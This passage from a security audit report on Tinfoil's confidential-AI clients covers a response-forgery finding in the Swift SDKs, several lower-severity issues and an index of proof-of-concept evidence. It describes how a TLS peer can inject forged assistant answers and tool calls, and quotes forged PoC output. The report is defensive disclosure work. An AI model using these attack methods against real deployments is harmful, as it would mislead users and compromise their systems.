from Apple-documented behaviour and Textual's own README/demos, which render
`![Random image](https://picsum.photos/…)` over the network in the default configuration.

**Fix:** install an `imageAttachmentLoader` that refuses remote URLs (or routes them through the
attested metadata enclave with click-to-load), and gate `render_image`/`link_preview` the same way.

## Finding 18: tinfoil-swift / EHBP Swift / openai-swift-fork return a TLS peer's nonce-less non-2xx body as the model's completion (Medium; Swift analogue of Finding 4)

**Component:** EHBP Swift client 0.3.2 (`swift/Sources/EHBP/Client.swift:251-263`: a response with
no `Ehbp-Response-Nonce` and a status outside 2xx is passed through untouched), tinfoil-swift 0.8.2
(shipped in the iOS app) and HEAD `81e07a1` (`EHBPURLSession.swift` forwards the pass-through
unchanged after the 422 key-config inspection), openai-swift-fork 0.0.15
(`StreamingSession.swift:159-161`: only `statusCode >= 400` is an error, so a 3xx body is parsed as
SSE; `URLSessionProtocol+MakeDataTask.swift:19-35`: the non-streaming decoder never looks at the status).

**Attack:** the TLS peer (a `baseURL` forwarding proxy by design, or a WebPKI-capable on-path party
for the router hostname in the iOS app's direct mode) answers a sealed POST with a nonce-less 300
(streaming) or any-status (non-streaming) body; the client returns it as the assistant's answer,
including `tool_calls` that the iOS app renders as GenUI widgets. Integrity only; the sealed request
never exposes the prompt. The Swift 303 downgrade fails closed (unlike Go), and 2xx-without-nonce and
4xx are rejected.

**PoC:** `ios-swift/evidence/hunter/forged-response-tests.txt` (Swift 6.2.1 on Linux, tinfoil-swift
0.8.2 session layer + EHBP 0.3.2 + openai-swift-fork 0.0.15 against a loopback raw-HTTP server that
never holds the HPKE key): `300 streaming: client received text="FORGED BY TLS PEER: wire $1,000,000
to account 12345" finish=stop`, `500 non-streaming: client received text="FORGED BY TLS PEER…"`;
controls: 200 without nonce → `missingHeader`, 404 → `statusError`, 303 → GET → `missingHeader`.
Linux-only shims are limited to `poc-linux-patches.diff`. **Medium**
(`AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N` = 5.9 in proxy mode).

**Fix:** treat any nonce-less response to a sealed request as an error in tinfoil-swift (as SPEC §5.3
requires of callers), and make openai-swift-fork reject non-2xx statuses on both paths.

---

## Lower-severity and informational items (verified, reported for completeness)

- **Router `/metrics` poller sends the `METRICS_API_KEY` admin bearer over WebPKI-only TLS.**
  `confidential-model-router` 6494b7d `manager/metrics.go:56-64,152-165` builds the scrape client with
  `http.DefaultTransport` while every other router-to-enclave hop is pinned with `TLSBoundRoundTripper`.
  A party holding a WebPKI certificate for a model-enclave hostname on the router's egress path (the
  enclave's host operator, CA mis-issuance) receives the key once per second. Verified 2/3 (code and PoC
  upheld; the threat-model reviewer rated it Low because only an operational credential is exposed and
  the key's permission scope lives in the closed control plane). Fix: pass `verification.TLSPublicKeyFP`
  into `newEnclaveMetrics` and use the pinned transport. Evidence: `router-metrics-key-unpinned/`.
- **Clean frame-boundary truncation of streamed completions is undetectable in every EHBP client.**
  Reproduced for Go (openai-go returns a truncated answer with `stream.Err()==nil` and no
  `finish_reason`) and Rust; Tinfoil already documents it as a protocol limitation
  (`conformance/SECURITY-AUDIT.md`, SPEC 6.2.1). Noted because the Tinfoil Chat harness acts on streamed
  tool calls, so dropping the tail changes behaviour. Evidence: `ehbp-stream-truncation-known-limitation/`.
- **Web app key handling (Low, unverified):** a signed-out user's chat encryption key is adopted by the
  next account that signs in on the same browser, and raw WebAuthn PRF output is persisted unencrypted in
  `localStorage` (`webapp-keys-storage` hunter; not sent to verification).
- **`example-client-kms` blueprint delivers secrets to any identically attested deployment** (no
  operator/domain binding; example code only, not verified).

Hunters' dead ends (hypotheses examined and rejected, with reasons) and per-area coverage notes are
recorded in `verification-verdicts-round2.json`.

## Evidence index

```
REPORT.md                                  this file (REPORT.md.bak-round1 = the round-1 version)
verification-verdicts.json                 round-1 verdicts (lens, severity, confidence, evidence, caveats)
verification-verdicts-round2.json          round-2 hunter candidates, dead ends, coverage notes and all 46 verifier verdicts
ehbp-h2-retry-plaintext/                   Finding 1: PoC repos (EHBP HEAD, EHBP v0.3.2, tinfoil-go) and evidence/
python-tdx-collateral-dupkey/              Finding 2: evidence/ (hunter PoC, verifier scripts and outputs); evidence/nested-variant/ (addendum)
cee-snapshot-auth-bypass/                  Finding 3: evidence/ (run scripts, outputs, race test)
ehbp-response-forgery/                     Finding 4: evidence/
summarizer-postsend-pin/                   Finding 5: evidence/
webapp-image-exfil/                        Finding 6: vitest PoCs, headless-Chromium run under the production CSP, three hunters' and verifiers' evidence
gateway-catalog-any-repo/                  Finding 7: Go tests, public release artifacts, loopback gateway run, verifier end-to-end test
go-tdx-collateral-casefold/                Finding 8: run-pocs.sh, library/tinfoil-go/VerifyV3 PoCs, real Intel collateral, minimal Go json check
harness-webfetch-injection-exfil/          Finding 9: loopback harness + websearch + Exa stub + attacker server run (run.sh, out/*.log)
js-sigstore-tlog-unsigned-entry/           Finding 10: rekor-bypass.mjs, forged-ATC SDK run, conformance vector 094
python-rekey-bodyless-downgrade/           Finding 11: poc_retry_bodyless.py and logs on the PyPI wheels
sync-attachment-key-derivable/             Finding 12: Go test + real-binary run against the S3 encryption sidecar
python-pck-crl-issuer-not-bound/           Finding 13: poc_crl_substitution.py with genuine Intel CRLs
sandbox-tunnel-no-auth/                    Finding 14: poc_sandbox_tunnel_test.go
proxy-desktop-unsigned-autoupdate/         Finding 15: artifact analysis (unsigned installers, app-update.yml)
webapp-sandbox-origin-exfil/               Finding 16: sandbox-exfil.mjs runs (shipped and hardened CSP)
ios-swift/                                 Findings 17-18: static trace, Swift PoC tests and output, Linux-only patches
router-metrics-key-unpinned/               lower-severity item: PoC and logs
ehbp-stream-truncation-known-limitation/   lower-severity item: Go/Rust truncation PoCs
```

The PoC files are drop-ins for the repository checkout and version named in each finding. Most need only
the local Go 1.27.1, Node 24, Python 3.14 or Swift toolchains; the browser PoCs use Playwright's Chromium.
The pristine clones, toolchain and hunters' working copies used for this review live under
`/root/tinfoil-review/` (`repos/`, `env.sh`, `work/`).
